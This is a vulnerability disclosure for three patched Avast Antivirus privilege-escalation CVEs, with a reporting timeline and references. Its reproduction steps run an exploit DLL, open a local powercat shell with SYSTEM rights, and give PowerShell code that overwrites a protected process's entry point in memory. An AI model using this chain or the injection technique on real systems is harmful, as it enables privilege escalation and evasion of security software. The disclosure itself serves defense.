# CVE-2021-45335 & CVE-2021-45336 & CVE-2021-45337

## Description

Avast Antivirus' Sandbox component (*AswEngSrv.exe*) had an insecure permission which could be abused by 
local user to control the outcome of scans, and therefore evade detection or delete arbitary system files.

Avast Antivirus' Sandbox component (*AswEngSrv.exe*) doesn't prevent sandboxed malicious code from scheduling 
task and become back token without restricted SID, job and with powerfull privileges.

Avast Antivirus' Self-Defense component (*aswSP.sys*) implements code that manually makes process AmPPL. 
This code just changes EPROCESS.Protection field for process running as SYSTEM from image 
*"C:\Program Files\AVAST Software\Avast\wsc_proxy.exe"*. Therefore malicious code running as SYSTEM can run 
*wcs_proxy.exe* and overwrite image in process memory. Then *aswSP.sys* makes this process antimalware protected.

## Impact

Multiple local privilege escalation vulnerabilities in Avast Free Antivirus prior to 20.8 allow a restricted user 
to connecting the issues together into an attack chain and execute code as "NT Authority\System" antimalware 
protected process (AM-PPL).

## Steps to reproduce

1. Run *rundll32.exe SandboxScheduleSystemAmPplProcessExploit.dll,Exploit*;
2. Run PowerShell.exe and type the following command: ". .\powercat.ps1;powercat -c 127.0.0.1 -p 12345";
3. Enjoy SYSTEM privileges!
4. Now type in PowerShell.exe:
```
$pplProcess = New-Win32Process -CommandLine "C:\Program Files\AVAST Software\Avast\wsc_proxy.exe" -CreationFlags Suspended
$pplProcess.Process.Protection
$pplProcess.Process.GrantedAccess
$entryPoint = $pplProcess.Process.ImageInformation.TransferAddress
$pplProcess.Process.ProtectMemory($entryPoint, 0x1000, 0x40)
[Byte[]] $tightLoopCode = 0xcc, 0xeb, 0xfe
$pplProcess.Process.WriteMemory($entryPoint, $tightLoopCode)
$pplProcess.Process.Resume()
$pplProcess.Process.Protection
```
5. Observe antimalware protected *wsc_proxy.exe* process, which executes tight loop.

## Resolution

This issue fixed since Avast 20.8.

## Disclosure Timeline

25-03-2020 Initial report sent to Avast.

26-03-2020 Initial response from Avast stating theyâ€™re being reviewed it.

23-04-2020 Avast triaged the issue reported as a valid issue and is starting work on a fix.

08-09-2020 Avast released patched version of product.

## References

[CVE-2021-45335](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45335)

[CVE-2021-45336](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45336)

[CVE-2021-45337](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45337)

[Avast Hall of Fame](https://www.avast.com/hacker-hall-of-fame/en/researcher-david-eade-reports-antitrack-bug-to-avast-0)

[Write-Up](https://the-deniss.github.io/posts/2023/02/09/elevation-of-privileges-from-everyone-through-avast-av-sandbox-to-system-amppl.html)
